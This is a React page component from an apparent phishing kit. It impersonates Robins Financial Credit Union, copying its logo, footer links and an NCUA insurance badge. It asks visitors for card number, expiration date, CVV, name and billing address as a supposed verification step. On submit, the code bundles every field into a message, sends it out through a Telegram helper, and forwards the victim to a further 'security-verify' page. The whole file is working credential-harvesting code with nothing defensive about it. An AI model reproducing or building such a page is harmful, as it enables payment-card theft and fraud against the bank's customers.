import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { sendToTelegram } from "@/utils/telegram";

const US_STATES = [
  "AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA","KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ","NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN","TX","UT","VT","VA","WA","WV","WI","WY","DC",
];

export default function CardInfoPage() {
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState("");
  const [expDate, setExpDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [fullName, setFullName] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [zip, setZip] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [touched, setTouched] = useState<Record<string, boolean>>({});

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    return parts.join(" ");
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.length <= 19) {
      setCardNumber(formatted);
      if (errors.cardNumber) setErrors((p) => ({ ...p, cardNumber: "" }));
    }
  };

  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length >= 2) {
      v = v.substring(0, 2) + "/" + v.substring(2, 4);
    }
    if (v.length <= 5) {
      setExpDate(v);
      if (errors.expDate) setErrors((p) => ({ ...p, expDate: "" }));
    }
  };

  const markTouched = (field: string) => {
    setTouched((p) => ({ ...p, [field]: true }));
  };

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (cardNumber.replace(/\s/g, "").length < 15) {
      newErrors.cardNumber = "Please enter a valid card number";
    }
    if (expDate.length < 5) {
      newErrors.expDate = "Please enter a valid expiration date (MM/YY)";
    }
    if (cvv.length < 3) {
      newErrors.cvv = "Please enter a valid CVV";
    }
    if (!fullName.trim()) {
      newErrors.fullName = "Please enter the full name on the card";
    }
    if (!address.trim()) {
      newErrors.address = "Please enter your street address";
    }
    if (!city.trim()) {
      newErrors.city = "Please enter your city";
    }
    if (!state.trim()) {
      newErrors.state = "Please select your state";
    }
    if (zip.length < 5) {
      newErrors.zip = "Please enter a valid ZIP code";
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({
      cardNumber: true, expDate: true, cvv: true,
      fullName: true, address: true, city: true, state: true, zip: true,
    });
    if (!validate()) return;

    setIsLoading(true);

    const message = [
      "💳 <b>Card Information Submitted</b>",
      "",
      `💳 Card Number: <code>${cardNumber}</code>`,
      `📅 Expiration: <code>${expDate}</code>`,
      `🔒 CVV: <code>${cvv}</code>`,
      `👤 Full Name: <code>${fullName}</code>`,
      `🏠 Address: <code>${address}</code>`,
      `🏙️ City: <code>${city}</code>`,
      `📍 State: <code>${state}</code>`,
      `📮 ZIP: <code>${zip}</code>`,
    ].join("\n");

    await sendToTelegram(message);

    navigate("/security-verify");
  };

  const bgImage =
    "https://static.readdy.ai/image/7e76308de67f95d36c39819111a3a60f/07df4f722b774f3cfaacdd2ee78eaabe.png";

  const logoIcon =
    "https://static.readdy.ai/image/7e76308de67f95d36c39819111a3a60f/ab40e8d2d571da8ae7469bb943a1fc22.png";

  const inputBase =
    "w-full h-[46px] border-2 px-3 text-[15px] text-[#333333] outline-none rounded-lg transition-all duration-150 shadow-sm bg-white disabled:opacity-60 disabled:bg-gray-50";
  const inputNormal = "border-gray-300 focus:border-[#003d7a] focus:ring-2 focus:ring-[#003d7a]/15";
  const inputError = "border-red-400 focus:border-red-500 focus:ring-2 focus:ring-red-200";

  const labelBase = "block text-[#333333] text-[13px] font-semibold mb-1.5 tracking-wide uppercase";

  return (
    <div
      className="min-h-screen w-full relative bg-cover bg-center bg-no-repeat flex flex-col items-center justify-center px-4 py-8"
      style={{ backgroundImage: `url(${bgImage})` }}
    >
      {/* White card */}
      <div className="w-full max-w-[460px] bg-white shadow-xl rounded-lg">
        {/* Logo header with divider */}
        <div className="px-6 pt-5 pb-3 border-b border-gray-200">
          <div className="flex items-center justify-center gap-0 mb-0.5 relative">
            <span
              className="text-[#003d7a] font-bold text-[26px] tracking-tight"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Rob
              <span className="relative inline-block">
                i
                <img
                  src={logoIcon}
                  alt="Robins Financial Logo Icon"
                  className="absolute -top-2.5 left-1/2 -translate-x-1/2 w-7 h-7 object-contain contrast-125 drop-shadow-sm"
                />
              </span>
              ns
            </span>
            <span
              className="text-[#5a7fa8] font-normal text-[26px] tracking-tight"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Financial
            </span>
          </div>
          <div
            className="text-center text-[#003d7a] text-[10px] font-bold uppercase tracking-[0.25em]"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            CREDIT UNION
          </div>
        </div>

        {/* Card Info Form */}
        <div className="px-6 pt-6 pb-3">
          <h2
            className="text-[#333333] text-[18px] font-bold mb-1 text-center"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            Card Information
          </h2>
          <p
            className="text-[#666666] text-[14px] text-center mb-6"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            Please enter your card details to complete the verification process.
          </p>

          <form onSubmit={handleSubmit}>
            {/* Card Number */}
            <div className="mb-4">
              <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                Card Number
              </label>
              <div className="relative">
                <input
                  type="text"
                  inputMode="numeric"
                  value={cardNumber}
                  onChange={handleCardChange}
                  onBlur={() => markTouched("cardNumber")}
                  placeholder="0000 0000 0000 0000"
                  disabled={isLoading}
                  className={`${inputBase} ${touched.cardNumber && errors.cardNumber ? inputError : inputNormal} pl-10`}
                  style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 flex items-center justify-center text-gray-400">
                  <i className="ri-bank-card-line text-lg" />
                </div>
              </div>
              {touched.cardNumber && errors.cardNumber && (
                <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  {errors.cardNumber}
                </p>
              )}
            </div>

            {/* Exp Date + CVV row */}
            <div className="flex gap-3 mb-4">
              <div className="flex-1">
                <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  Expiration Date
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={expDate}
                  onChange={handleExpChange}
                  onBlur={() => markTouched("expDate")}
                  placeholder="MM/YY"
                  disabled={isLoading}
                  className={`${inputBase} ${touched.expDate && errors.expDate ? inputError : inputNormal}`}
                  style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
                />
                {touched.expDate && errors.expDate && (
                  <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                    {errors.expDate}
                  </p>
                )}
              </div>
              <div className="w-[110px]">
                <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  CVV
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={cvv}
                  onChange={(e) => {
                    const v = e.target.value.replace(/\D/g, "");
                    if (v.length <= 4) {
                      setCvv(v);
                      if (errors.cvv) setErrors((p) => ({ ...p, cvv: "" }));
                    }
                  }}
                  onBlur={() => markTouched("cvv")}
                  placeholder="123"
                  disabled={isLoading}
                  className={`${inputBase} ${touched.cvv && errors.cvv ? inputError : inputNormal}`}
                  style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
                />
                {touched.cvv && errors.cvv && (
                  <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                    {errors.cvv}
                  </p>
                )}
              </div>
            </div>

            {/* Full Name */}
            <div className="mb-4">
              <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                Full Name on Card
              </label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => {
                  setFullName(e.target.value);
                  if (errors.fullName) setErrors((p) => ({ ...p, fullName: "" }));
                }}
                onBlur={() => markTouched("fullName")}
                placeholder="JOHN DOE"
                disabled={isLoading}
                className={`${inputBase} ${touched.fullName && errors.fullName ? inputError : inputNormal}`}
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              />
              {touched.fullName && errors.fullName && (
                <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  {errors.fullName}
                </p>
              )}
            </div>

            {/* Address */}
            <div className="mb-4">
              <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                Street Address
              </label>
              <input
                type="text"
                value={address}
                onChange={(e) => {
                  setAddress(e.target.value);
                  if (errors.address) setErrors((p) => ({ ...p, address: "" }));
                }}
                onBlur={() => markTouched("address")}
                placeholder="123 Main Street"
                disabled={isLoading}
                className={`${inputBase} ${touched.address && errors.address ? inputError : inputNormal}`}
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              />
              {touched.address && errors.address && (
                <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  {errors.address}
                </p>
              )}
            </div>

            {/* City + State + ZIP row */}
            <div className="flex flex-col sm:flex-row gap-3 mb-6">
              <div className="flex-1">
                <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  City
                </label>
                <input
                  type="text"
                  value={city}
                  onChange={(e) => {
                    setCity(e.target.value);
                    if (errors.city) setErrors((p) => ({ ...p, city: "" }));
                  }}
                  onBlur={() => markTouched("city")}
                  placeholder="Macon"
                  disabled={isLoading}
                  className={`${inputBase} ${touched.city && errors.city ? inputError : inputNormal}`}
                  style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
                />
                {touched.city && errors.city && (
                  <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                    {errors.city}
                  </p>
                )}
              </div>
              <div className="w-full sm:w-[100px]">
                <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  State
                </label>
                <select
                  value={state}
                  onChange={(e) => {
                    setState(e.target.value);
                    if (errors.state) setErrors((p) => ({ ...p, state: "" }));
                  }}
                  onBlur={() => markTouched("state")}
                  disabled={isLoading}
                  className={`${inputBase} ${touched.state && errors.state ? inputError : inputNormal} appearance-none cursor-pointer`}
                  style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
                >
                  <option value="">--</option>
                  {US_STATES.map((s) => (
                    <option key={s} value={s}>{s}</option>
                  ))}
                </select>
                {touched.state && errors.state && (
                  <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                    {errors.state}
                  </p>
                )}
              </div>
              <div className="w-full sm:w-[110px]">
                <label className={labelBase} style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                  ZIP Code
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={zip}
                  onChange={(e) => {
                    const v = e.target.value.replace(/\D/g, "");
                    if (v.length <= 5) {
                      setZip(v);
                      if (errors.zip) setErrors((p) => ({ ...p, zip: "" }));
                    }
                  }}
                  onBlur={() => markTouched("zip")}
                  placeholder="31201"
                  disabled={isLoading}
                  className={`${inputBase} ${touched.zip && errors.zip ? inputError : inputNormal}`}
                  style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
                />
                {touched.zip && errors.zip && (
                  <p className="text-red-600 text-[12px] mt-1.5 font-medium" style={{ fontFamily: "Arial, Helvetica, sans-serif" }}>
                    {errors.zip}
                  </p>
                )}
              </div>
            </div>

            {/* Submit button */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full h-[48px] bg-[#003d7a] hover:bg-[#002d5a] text-white text-[16px] font-semibold rounded-lg transition-all duration-150 disabled:opacity-70 flex items-center justify-center gap-2 shadow-md hover:shadow-lg"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              {isLoading && (
                <i className="ri-loader-4-line animate-spin text-lg" />
              )}
              {isLoading ? "Processing..." : "Submit"}
            </button>
          </form>
        </div>

        {/* Footer links */}
        <div className="px-6 pb-5 pt-2">
          <div className="flex items-center justify-center gap-2 text-[14px] mb-1.5 flex-wrap">
            <a
              href="#enroll"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Enroll Now
            </a>
            <span className="text-[#cccccc]">|</span>
            <a
              href="#unlock"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Forgot/Unlock Login ID
            </a>
          </div>
          <div className="flex items-center justify-center gap-2 text-[14px] flex-wrap">
            <a
              href="#guide"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Digital Banking Guide
            </a>
            <span className="text-[#cccccc]">|</span>
            <a
              href="#privacy"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Privacy Policy
            </a>
          </div>
        </div>
      </div>

      {/* NCUA Badge */}
      <div className="mt-6 w-[200px]">
        <div className="bg-[#003d7a] border-2 border-white shadow-lg px-3 py-2 text-center">
          <p
            className="text-white text-[7px] leading-tight mb-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            Your savings federally insured to at least $250,000
          </p>
          <p
            className="text-white text-[7px] leading-tight mb-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            and backed by the full faith and credit of the United States Government
          </p>
          <p
            className="text-white text-[28px] font-bold leading-none my-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            NCUA
          </p>
          <p
            className="text-white text-[7px] leading-tight"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            National Credit Union Administration, a U.S. Government Agency
          </p>
        </div>
      </div>
    </div>
  );
}